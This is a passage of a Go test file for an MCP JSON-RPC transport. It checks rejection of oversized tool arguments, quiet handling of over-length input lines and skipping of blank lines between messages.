		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 900)
	if isErr, _ := env["result"].(map[string]interface{})["isError"].(bool); !isErr {
		t.Fatalf("oversized evidence_refs must be rejected, got %+v", env)
	}
}

// ---------- Framing ----------

func TestMCPTransportOverCapLineRefusesAndClosesQuietly(t *testing.T) {
	_ = initMCPTestHome(t)
	priorIn, priorOut := ioIn, ioOut
	t.Cleanup(func() { ioIn, ioOut = priorIn, priorOut })
	oversized := strings.Repeat("x", mcpMaxLineBytes+1) + "\n"
	ioIn = strings.NewReader(oversized)
	var outBuf bytes.Buffer
	ioOut = &outBuf
	if err := runMcpTransportLoop(); err != nil {
		t.Fatalf("transport loop returned error on over-cap line: %v", err)
	}
	if outBuf.Len() != 0 {
		t.Fatalf("over-cap line produced output, want none: %q", outBuf.String())
	}
}

func TestMCPTransportBlankLinesIgnoredBetweenEnvelopes(t *testing.T) {
	homePath := initMCPTestHome(t)
	a := `{"jsonrpc":"2.0","id":1,"method":"ping"}` + "\n"
	b := `{"jsonrpc":"2.0","id":2,"method":"ping"}` + "\n"
	lines := runMCPTransport(t, nil, []string{a, "\n", "  \n", b, "\n"}, homePath)
	if len(lines) < 2 {
		t.Fatalf("blank-line skipping lost envelopes: %+v", lines)
	}
	rawResp(t, lines, 1)
	rawResp(t, lines, 2)
}

// ---------- Helpers ----------

func decodeMCPStructuredContent(t *testing.T, result map[string]interface{}) map[string]interface{} {
	t.Helper()
	structObj, ok := result["structuredContent"].(map[string]interface{})
	if !ok {
		t.Fatalf("result missing structuredContent: %+v", result)
	}
	return structObj
}

func mustJSON(t *testing.T, v interface{}) []byte {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return b
}
